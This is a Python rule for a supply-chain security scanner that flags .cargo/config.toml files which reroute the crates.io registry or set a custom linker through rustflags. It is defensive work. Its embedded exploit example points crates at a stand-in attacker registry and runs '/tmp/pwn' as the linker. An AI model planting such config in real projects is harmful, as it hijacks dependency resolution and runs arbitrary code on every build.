"""CARGO-012. .cargo/config.toml overrides the registry source or injects build flags."""
from __future__ import annotations

from typing import Any

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import CargoFile

RULE = Rule(
    id="CARGO-012",
    title=".cargo/config.toml overrides the registry source or injects build flags",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3", "CICD-SEC-4"),
    esf=("ESF-S-TRUSTED-REG", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-829", "CWE-94"),
    recommendation=(
        "Audit ``.cargo/config.toml`` source-replacement and "
        "build-flag keys. A ``[source.crates-io] replace-with`` "
        "reroutes the entire dependency graph to another source "
        "without touching a single ``Cargo.toml`` line, so a "
        "compromised or attacker-controlled replacement registry "
        "serves every crate the build pulls. A linker / link-arg "
        "injected through ``[build] rustflags`` (or "
        "``[target.<cfg>] rustflags``) can run an arbitrary binary "
        "at link time. Remove the source replacement (or point it "
        "at a trusted, access-controlled internal mirror that you "
        "audit), and drop any ``rustflags`` that set a custom "
        "linker or ``link-arg`` unless it's a reviewed, constant "
        "value the build genuinely needs."
    ),
    docs_note=(
        "Parses the nearest ``.cargo/config.toml`` (walked up from "
        "the manifest to the scan root) and fires on two shapes: "
        "(1) any ``[source.<name>]`` table with a ``replace-with`` "
        "key, the source-substitution knob CARGO-005's ``docs_note`` "
        "calls out, which reroutes resolution without a Cargo.toml "
        "edit; (2) a ``[build]`` or ``[target.<cfg>]`` "
        "``rustflags`` that sets a custom linker (``-C linker=`` / "
        "``-Clinker=``) or a ``link-arg`` / ``link-args``, which can "
        "execute a binary at link time.\n\n"
        "Distinct from CARGO-008 (``[patch]`` / ``[replace]`` in "
        "``Cargo.toml``) and CARGO-005 (a per-dependency "
        "``registry`` key): this rule audits the separate "
        "``.cargo/config.toml`` file, which the manifest rules never "
        "read."
    ),
    known_fp=(
        "A ``replace-with`` pointing at a trusted, access-controlled "
        "internal mirror is a legitimate vendoring pattern, and a "
        "constant ``link-arg`` is sometimes genuinely required for a "
        "native build. Suppress per repo with a rationale once the "
        "replacement source and any linker flags are confirmed "
        "trusted.",
    ),
    incident_refs=(
        "Source-replacement / dependency-confusion class: a "
        "``replace-with`` silently rerouting the whole crate graph "
        "to an attacker-influenced registry, invisible to anyone "
        "reading only ``Cargo.toml``.",
    ),
    exploit_example=(
        "# Vulnerable .cargo/config.toml: reroute every crate.\n"
        "[source.crates-io]\n"
        'replace-with = "evil-mirror"\n'
        "[source.evil-mirror]\n"
        'registry = "https://crates.attacker.test/index"\n'
        "[build]\n"
        'rustflags = ["-Clinker=/tmp/pwn"]\n'
        "\n"
        "# Attack: cargo resolves the entire dependency graph from\n"
        "# the attacker's registry (no Cargo.toml change is visible\n"
        "# in review), and the custom linker binary runs at link\n"
        "# time on every build.\n"
        "\n"
        "# Safe: no source replacement (or a trusted internal\n"
        "# mirror), and no custom linker / link-arg rustflags.\n"
    ),
)


_LINKER_TOKENS: tuple[str, ...] = (
    "-clinker", "-c linker", "linker=", "link-arg", "link-args",
)


def _rustflags_tokens(value: Any) -> str:
    """Flatten a rustflags value (TOML list or string) to one
    lowercase string for substring matching."""
    if isinstance(value, list):
        return " ".join(str(v) for v in value).lower()
    if isinstance(value, str):
        return value.lower()
    return ""


def _has_linker_flag(value: Any) -> bool:
    flat = _rustflags_tokens(value)
    return any(tok in flat for tok in _LINKER_TOKENS)


def check(manifest: CargoFile) -> Finding:
    cfg = manifest.cargo_config
    if not cfg:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=manifest.path,
            description="No .cargo/config.toml to audit.",
            recommendation=RULE.recommendation, passed=True,
        )
    offenders: list[str] = []

    sources = cfg.get("source")
    if isinstance(sources, dict):
        for name, table in sources.items():
            if isinstance(table, dict) and table.get("replace-with"):
                offenders.append(
                    f"[source.{name}] replace-with = "
                    f"{table['replace-with']!r}"
                )

    build = cfg.get("build")
    if isinstance(build, dict) and _has_linker_flag(build.get("rustflags")):
        offenders.append("[build] rustflags sets a linker / link-arg")

    targets = cfg.get("target")
    if isinstance(targets, dict):
        for cfg_name, table in targets.items():
            if isinstance(table, dict) and _has_linker_flag(
                table.get("rustflags"),
            ):
                offenders.append(
                    f"[target.{cfg_name}] rustflags sets a "
                    f"linker / link-arg"
                )

    passed = not offenders
    resource = manifest.cargo_config_path or manifest.path
    desc = (
        ".cargo/config.toml declares no source override or "
        "link-time build flag."
        if passed else
        f"{len(offenders)} risky .cargo/config.toml key(s): "
        f"{'; '.join(offenders[:4])}"
        f"{' …' if len(offenders) > 4 else ''}. A source "
        f"replacement reroutes the whole crate graph; a custom "
        f"linker / link-arg runs a binary at link time."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=resource, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=[Location(path=resource, start_line=1, end_line=1)]
        if not passed else [],
    )
